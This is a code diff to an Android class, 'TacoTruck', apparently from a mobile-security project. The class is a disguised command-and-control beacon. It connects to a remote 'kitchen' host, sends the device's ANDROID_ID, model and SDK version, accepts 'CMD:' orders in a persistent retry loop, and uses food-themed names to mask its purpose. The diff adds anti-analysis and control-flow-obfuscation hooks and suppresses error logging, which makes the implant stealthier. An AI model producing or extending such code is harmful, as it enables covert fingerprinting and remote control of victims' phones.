@@ -5,6 +5,9 @@ import android.os.Build;
 import android.provider.Settings;
 import android.util.Log;
 
+import com.example.mobsec_823.utils.SafetyNet;
+import com.example.mobsec_823.utils.SecretBox;
+
 import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -36,28 +39,35 @@ public class TacoTruck {
 
     public void openForBusiness() {
         if (isOpen) return;
+        
+        // Anti-Analysis check: Log detection but proceed for research
+//        if (!SafetyNet.INSTANCE.isEnvironmentSafe()) {
+//            Log.e(TAG, "Analysis environment detected, but proceeding for research purposes.");
+//        }
+
         isOpen = true;
 
         new Thread(() -> {
             while (isOpen) {
                 try {
+                    // Logic Protection: Control Flow Flattening
+                    if (!SafetyNet.INSTANCE.checkKitchenPermit(99)) {
+                        break;
+                    }
+
                     socket = new Socket(kitchenIp, kitchenPort);
                     out = new PrintWriter(socket.getOutputStream(), true);
                     in = socket.getInputStream();
 
-                    // Perform handshake as per SleepyMob protocol
                     sendHandshake();
-
-                    // Listen for commands until the connection is lost
                     listenForOrders();
 
                 } catch (Exception e) {
-
                 } finally {
                     closeShop();
                     if (isOpen) {
                         try {
-                            Thread.sleep(5000);
+                            Thread.sleep(10000); // Retry every 10 seconds
                         } catch (InterruptedException ie) {
                             Thread.currentThread().interrupt();
                             break;
@@ -72,6 +82,8 @@ public class TacoTruck {
         String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
         String model = Build.MODEL;
         int sdk = Build.VERSION.SDK_INT;
+        
+        // Handshake pattern: ID:<id>;MODEL:<model>;SDK:<sdk>
         String handshakeMsg = String.format("ID:%s;MODEL:%s;SDK:%d", deviceId, model, sdk);
         sendToKitchen(handshakeMsg);
     }
@@ -80,19 +92,24 @@ public class TacoTruck {
         BufferedReader reader = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
         String line;
         while ((line = reader.readLine()) != null) {
+            // "CMD:" prefix is part of the protocol
             if (line.startsWith("CMD:")) {
                 if (listener != null) {
                     listener.onOrderReceived(line.substring(4));
                 }
             }
         }
-        throw new Exception("Server closed the connection gracefully.");
     }
 
     public void sendToKitchen(String message) {
         if (out != null) {
-            // Run on a new thread to avoid blocking the caller
-            new Thread(() -> out.println(message)).start();
+            new Thread(() -> {
+                try {
+                    out.println(message);
+                } catch (Exception e) {
+                    // ignore
+                }
+            }).start();
         }
     }
 
@@ -107,7 +124,6 @@ public class TacoTruck {
                 socket.close();
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error closing the truck down.", e);
         }
         socket = null;
         out = null;
